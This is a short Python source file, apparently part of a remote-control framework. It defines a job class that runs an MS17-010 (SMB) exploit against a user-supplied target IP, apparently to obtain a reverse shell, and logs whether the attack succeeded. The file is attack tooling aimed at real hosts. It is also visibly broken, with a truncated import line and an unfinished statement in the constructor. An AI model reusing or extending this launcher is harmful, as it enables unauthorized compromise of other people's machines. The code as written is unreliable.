from shell_control.shell_control_job import ShellControlJob
from ms1710.zzz_exploit import exploit
from ms1710.lis


class MS1710ReverseShellCommand(ShellControlJob):
    def __init__(self):
        self.is_exploit_running = False
        self.reverse_listener

    def execute_job(self, command_args, log_stream):
        target_ip = command_args['target']
        log_stream.debug('Selected IP to attack = ' + target_ip)
        self.is_exploit_running = True
        if exploit(target=target_ip):
            log_stream.debug("Exploit Succ!")
        else:
            log_stream.warn("Exploit Failure")

    def is_job_running(self):
        pass

